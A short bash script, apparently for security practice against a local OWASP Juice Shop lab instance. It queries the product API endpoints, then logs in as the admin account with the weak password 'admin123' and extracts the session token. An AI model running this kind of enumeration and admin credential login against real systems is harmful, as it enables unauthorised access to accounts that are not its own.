#!/bin/bash

TARGET_IP="10.0.1.2"
TARGET_PORT="3000"

curl -s "http://$TARGET_IP:$TARGET_PORT"

curl -s "http://$TARGET_IP:$TARGET_PORT/api/Products"

curl -s "http://$TARGET_IP:$TARGET_PORT/api/Products/5"

LOGIN_RESPONSE=$(curl -s -X POST "http://$TARGET_IP:$TARGET_PORT/rest/user/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@juice-sh.op","password":"admin123"}')

TOKEN=$(echo "$LOGIN_RESPONSE" | grep -o '"token":"[^"]*' | cut -d'"' -f4)

if [[ -z "$TOKEN" ]]; then
    echo "❌ Login failed"
else
    echo "✅ Logged in successfully"
fi
